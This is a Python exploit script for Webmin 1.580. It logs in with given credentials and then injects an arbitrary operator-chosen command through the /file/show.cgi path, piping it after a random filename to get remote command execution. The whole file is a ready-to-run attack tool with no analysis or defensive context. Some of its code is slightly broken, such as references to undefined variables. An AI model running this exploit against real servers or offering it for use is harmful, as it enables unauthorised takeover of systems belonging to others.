#!/usr/bin/env python3
# HackGodybj

import argparse
import random
import string
import sys
import urllib.parse
import requests



def get_args():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t", "--target", help="Target IP of webmin 1.580", required=True
    )
    parser.add_argument(
        "-p",
        "--port",
        help="The port that hosts webmin",
        required=False,
    )
    parser.add_argument(
        "-U",
        "--username",
        help="Username to login to webmin",
        required=True,
    )
    parser.add_argument(
        "-P",
        "--password",
        help="password for logging in Webmin",
        required=True,
    )
    parser.add_argument(
        "-c",
        "--command",
        help="Type the command to run on webmin",
        required=True,
    )
    parser.add_argument(
        "-s",
        "--ssl",
        help="for ssl strip or https://",
        action="store_true",
    )

    args = parser.parse_args()
    return args


class Exploit:
    def __init__(self, args):
        self.args = args
        self.validate_args()

        self.username = self.args.username
        self.password = self.args.password
        self.command = self.args.command

    def run(self):

        print(f"[+] targeting host {self.host} on port {self.port}")
        self.url = f"{self.schema}{self.host}:{self.port}"

        login_session = self.login()
        if not login_session:
            sys.stderr.write(
                f"[!] failed to login with user '{self.username}' and pw '{self.password}'\n"
            )
            return False

        print(
            f"[+] successfully logged in with user '{self.username}' and pw '{self.password}'"
        )

        self.execute_command()
        print(f"[+] executed '{self.command}' on '{self.host}'")

    def validate_args(self):
        self.host = self.args.target

        potential_schemas = ["http://", "https://"]

        if not self.args.ssl:
            for schema in potential_schemas:
                if self.host.startswith(schema):
                    break
            else:
                self.schema = potential_schemas[0]
        else:
            self.schema = potential_schemas[bool(args.ssl)]

        self.host = self.host.removeprefix(schema)

        if not self.args.port:
            if ":" in self.args.target:
                self.host, self.port = self.host.split(":")
            else:
                sys.stderr.write(
                    "[!] port is required (either pass -p or use IP:PORT syntax)"
                )
                exit(-1)
        else:
            self.host = self.args.target.removesuffix("/")
            self.port = self.args.port

        self.host = self.host.removesuffix(f":{self.port}")

    def login(self):
        self.session = requests.Session()

        try:
            response = self.session.post(
                self.url + "/session_login.cgi",
                data={
                    "user": self.username,
                    "pass": self.password,
                },
                cookies={"testing": "1"},
                allow_redirects=False,
            )
        except (ConnectionRefusedError, requests.exceptions.ConnectionError) as e:
            sys.stderr.write(f"[!] error: {e.args[0]}\n")
            exit(-1)

        if "sid" in self.session.cookies:
            return not self.session.cookies["sid"] == 1

    def execute_command(self):
        random_string = "".join(
            [random.choice(string.ascii_letters) for _ in range(random.randint(3, 12))]
        )

        self.session.get(
            self.url
            + f"/file/show.cgi/bin/{random_string}|{urllib.parse.quote(self.command)}|"
        )


if __name__ == "__main__":
    exploit = Exploit(get_args())
    success = exploit.run()

    if not success:
        sys.exit(1)